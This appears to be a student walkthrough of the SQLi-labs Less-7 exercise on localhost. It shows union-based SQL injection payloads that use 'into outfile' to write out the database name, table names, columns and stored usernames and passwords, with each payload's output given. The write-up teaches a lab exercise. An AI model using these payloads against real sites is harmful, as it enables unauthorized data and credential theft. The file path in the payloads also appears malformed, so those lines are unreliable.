We start off by giving an id parameter to start off with the injection after which we are greeted with a page that says “You are in…. Use outfile…… “

**PAYLOAD:**”localhost/sqli/Less-7/?id=1”

![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.001.jpeg)

As we can see even though we put any other payload like order by ar union type payload we will still get the same page, now to dump the data we will need to have another file (aka outfile). What we basically have to do is add the outfile function in the payload we have and direct the data to this particular file.

1.“localhost/sqli/Less-7/?id=1')) union all select 1,2,3” 2.“localhost/sqli/Less-7/?id=1')) order by 3”

The page remains unchanged.

![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.002.jpeg)

Now we will modify the payload with the above functionality of outfile

**PAYLOAD:**”localhost/sqli/Less-7/?id=1')) union all select 1,2,3 into outfile "dump.txt/home/rahulkrishnan/Desktop"--+”

![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.003.jpeg)

The output will be now directed to the outfile and printed in it like so



|1|Dumb|Dumb|
| - | - | - |
|1|2|3|
![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.004.jpeg)

We can do the same sql injection functions but the only difference is that the outcome or output will be now redirected and printed into a outfile.

Now we will continue by checking the database that the data is present in. **PAYLOAD:** “localhost/sqli/Less-7/?id=1')) union all select database(),2,3 into outfile "dump.txt/home/rahulkrishnan/Desktop"--+”



|1|Dumb|Dumb|
| - | - | - |
|security|2|3|
![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.005.jpeg)

We will now concat the table names of the database to the outfile using the following payload

**PAYLOAD:** “localhost/sqli/Less-7/?id=1')) union all select group\_concat(table\_name),2,3 into outfile "dump.txt/home/rahulkrishnan/Desktop"--+”

**OUTPUT:**



|1|Dumb|Dumb|
| - | - | - |
|emails,referers,uagents,users|2|3|
![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.006.jpeg)

We will now find the columns that are present in the table users using the following payload **PAYLOAD:** ”<http://localhost/sqli/Less-7/?id=1%27>))%20union%20all%20select%20group\_concat(column\_n ame),2,3%20from%20information\_schema.columns%20where%20table\_name=%22users%22 %20into%20outfile%20%22dump.txt/home/rahulkrishnan/Desktop%22--+”

**OUTPUT:**



|1|Dumb|Dumb|
| - | - | - |
|id,login,password,email,secre t,activated,reset\_code,admin, user\_id,first\_name,last\_name ,user,password,avatar,last\_lo gin,failed\_login,USER,CURR ENT\_CONNECTIONS,TOTA L\_CONNECTIONS,id,userna me,password|2|3|
Now we will concat the username and the password from the columns conceited from above.

![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.007.jpeg)

**PAYLOAD:**

“localhost/sqli/Less-7/?id=1')) union all select group\_concat(username),group\_concat(password),3 from users into outfile "dump.txt/home/rahulkrishnan/Desktop"--+”

**OUTFILE:**



|1|Dumb|Dumb|
| - | - | - |
|Dumb,Angelina,Dummy,secur e,stupid,superman,batman,ad min,admin1,admin2,admin3,d hakkan,admin4|Dumb,I-kill-you,p@ssword,cr appy,stupidity,genious,mob!le ,admin,admin1,admin2,admin 3,dumbo,admin4|3|

